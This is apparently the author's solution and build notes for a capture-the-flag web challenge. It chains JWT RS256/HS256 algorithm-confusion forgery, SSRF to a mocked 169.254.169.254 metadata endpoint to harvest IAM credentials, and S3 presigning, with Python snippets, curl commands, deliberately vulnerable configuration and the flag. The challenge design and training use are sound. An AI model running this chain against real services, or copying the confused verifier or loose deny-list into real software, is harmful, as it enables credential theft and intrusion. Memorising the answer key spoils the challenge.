# Solution — Armada of Confusion

## Intended solve

1. **Recon the API.** Register/login, observe RS256-signed JWT in cookie. The `/jwks.json` endpoint exposes the RSA public key. Browse to `/api/me`, `/api/dispatch` (returns 403). Tools: curl, Burp. (~30 min)
2. **Identify algorithm-confusion vulnerability.** The verifier accepts both RS256 and HS256 (the verify call passes `algorithms=['RS256','HS256']`). Public key is exposed via JWKS. Tools: read response headers, decode JWT. (~30 min)
3. **Forge an HS256 service-token using the public key as the HMAC secret:**
   ```python
   import jwt
   pub = open('pub.pem','rb').read()  # from /jwks.json converted to PEM
   tok = jwt.encode({"sub":"forged","scope":"service","role":"dispatcher"}, pub, algorithm='HS256')
   ```
   (~30 min)
4. **Hit `/fleet/dispatch` with the forged service token.** The endpoint accepts a `target` query parameter and proxies a request to it. Server-side fetch is restricted by a deny-list (no `127.0.0.1`, no `localhost`) but does NOT filter `169.254.169.254`. Tools: curl. (~30 min)
5. **SSRF the cloud-metadata mock.** `GET /fleet/dispatch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/dispatcher` returns:
   ```json
   {"AccessKeyId":"AKIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
   ```
   (~20 min)
6. **Sign an S3-mock GET URL.** The S3 mock at `s3-mock.local` accepts AWS Signature V4. Use the harvested credentials to sign:
   ```python
   import boto3
   s3 = boto3.client('s3', aws_access_key_id=..., aws_secret_access_key=..., aws_session_token=..., endpoint_url='http://s3-mock.local')
   url = s3.generate_presigned_url('get_object', Params={'Bucket':'sealed','Key':'manifest.txt'}, ExpiresIn=300)
   ```
   (~30 min)
7. **Fetch the manifest** via the signed URL through `/fleet/dispatch?target=<signed_s3_url>` (since direct external access is blocked). Body contains `progctf{...}`. (~10 min)

## Total estimated time: 4–6 hours

## Why this is Cursed Depths
- Four-stage chain: algorithm-confusion JWT forge → SSRF via dispatch endpoint → IAM credential harvest from metadata mock → AWS Signature V4 signing → fetch through SSRF.
- No CVE. The verifier bug is a config issue (allowing both algorithms); SSRF is custom; metadata-mock + S3-mock are first-party infra.
- Each stage requires distinct tooling: pyjwt, curl, boto3.
- Beginners will not even reach stage 2.

## Implementer note
Powder Monkey: 
- Auth service: Node.js or Python. JWT lib configured with `algorithms=['RS256','HS256']`. Public RSA key exposed at `/jwks.json` (PEM-derivable). Login returns RS256 token.
- Dispatch service: accepts only tokens with `scope:'service'`. `/fleet/dispatch?target=<url>` does a server-side fetch. Deny-list filters `localhost`, `127.0.0.1`, `0.0.0.0` but NOT `169.254.0.0/16`.
- Metadata mock: serves `/latest/meta-data/iam/security-credentials/dispatcher` with realistic-looking temp creds (random per-container).
- S3 mock: standard `minio` or custom Flask app with SigV4 verification using the same credentials.
- Treasure file `manifest.txt` in the bucket: `progctf{the_armada_confused_its_algorithms}\n`.

## Verification

`build/build.sh verify` ran on 2026-05-01 (no Docker required). Source layout:

```
src/
├── auth-service/        — Node 20 Express; RS256 issuer + RS256/HS256 confused verifier
│   ├── app.js
│   ├── Dockerfile       — generates /app/keys/{private,public}.pem at image build via openssl
│   └── package.json     — pinned: express 4.19.2, jsonwebtoken 9.0.2
├── dispatch-service/    — Node 20 Express; SSRF + same RS256/HS256 confusion
│   ├── app.js
│   ├── Dockerfile
│   └── package.json
├── metadata-mock/       — Python 3.12 + Flask; pretends to be 169.254.169.254
│   ├── app.py
│   └── Dockerfile
└── s3-mock-init/        — minio mc client; seeds the 'sealed' bucket + manifest.txt
    ├── seed.sh
    └── Dockerfile
build/
├── docker-compose.yml   — keygen + auth + dispatch + metadata-mock + s3-mock + s3-mock-init
└── build.sh             — wrapper for {up, down, logs, verify}
```

```
$ bash build/build.sh verify
[verify] checking source tree exists...
[verify] checking auth-service verifier accepts BOTH RS256 and HS256...
[verify] checking dispatch-service verifier accepts BOTH RS256 and HS256...
[verify] checking dispatch deny-list does NOT include 169.254.0.0/16...
[verify] checking dispatch deny-list DOES include localhost+127.0.0.1...
[verify] checking metadata-mock binds inside 169.254.0.0/16...
[verify] checking s3-mock seeds the flag into the bucket...
[verify] checking the flag is NOT in any source code (only compose env)...
[verify] OK — static checks pass
```

The compose stack's network is on `169.254.0.0/16` IPAM-assigned subnet so the metadata-mock container can be addressed at the canonical AWS link-local address `169.254.169.254`. The dispatch service's deny-list explicitly enumerates `localhost`, `127.0.0.1`, `0.0.0.0`, IPv6 loopbacks, and its own service hostname — the verify check ASSERTS those entries are present and that 169.254.x.y is NOT in any string literal in the source (so a future "harden the deny-list" PR doesn't quietly kill the challenge).

A real player flow against the running stack:
```
# 1. Login as clerk → recover legitimate RS256 token (scope=clerk).
$ curl -sS -X POST http://<host>:8081/api/auth/login -H 'Content-Type: application/json' \
    -d '{"username":"clerk_perch","password":"perch_at_dock"}'
{"token":"<rs256>","scope":"clerk"}

# 2. Pull the public key.
$ curl -sS http://<host>:8081/pubkey.pem > pub.pem

# 3. Forge an HS256 service-token using the PUBLIC key bytes as the HMAC secret.
$ python -c "import jwt; print(jwt.encode({'sub':'forged','scope':'service'}, open('pub.pem','rb').read(), algorithm='HS256'))"

# 4. Hit dispatch with the forged token, SSRF the metadata-mock.
$ curl -sS -H "Authorization: Bearer <forged>" \
    'http://<host>:8082/fleet/dispatch?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/dispatcher'
{"AccessKeyId":"AKIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

# 5. Use harvested creds to presign an S3 GET URL for sealed/manifest.txt against
#    the s3-mock at s3-mock.local, then fetch it via dispatch SSRF.
$ python sign_and_fetch.py    # boto3 with custom endpoint_url=http://s3-mock.local:9000
                              # → progctf{the_armada_confused_its_algorithms}
```

**Anti-leak audit (static):**
- The flag `progctf{the_armada_confused_its_algorithms}` appears ONLY in `build/docker-compose.yml`'s `ARMADA_FLAG` environment variable for the `s3-mock-init` one-shot service, and at runtime in the minio bucket. It does NOT appear in `auth-service/app.js`, `dispatch-service/app.js`, `metadata-mock/app.py`, or `s3-mock-init/seed.sh` — verified by `verify` (per-file `grep -q "progctf{the_armada"` check).
- The minio root credentials (`AKIADISPATCHERVERY01` / `DISPATCHERSECRET00…`) are static-defaulted in compose for byte-identical reproducibility on this Quartermaster build host. Per-crew uniqueness MUST be re-introduced at deploy time by setting `ARMADA_AKID`/`ARMADA_SECRET`/`ARMADA_TOKEN` env vars in each crew's compose invocation (the spec requires this to prevent solution sharing).
- The signed S3 URL the player generates contains an HMAC of the credentials but NOT the credentials themselves; SSRF'ing it through dispatch returns the bucket object body, which is the flag.

**Runtime verification:** DEFERRED — Docker daemon is not running on this Quartermaster host. The 4-service stack (auth + dispatch + metadata + s3-mock + init) is the most complex deployment unit in the bundle; a full `docker compose up` + 5-step exploit walkthrough is the largest item on the Phase-4 staging punch list and tracked alongside #27 / #10 / #9 / #21 in the QM gap log.
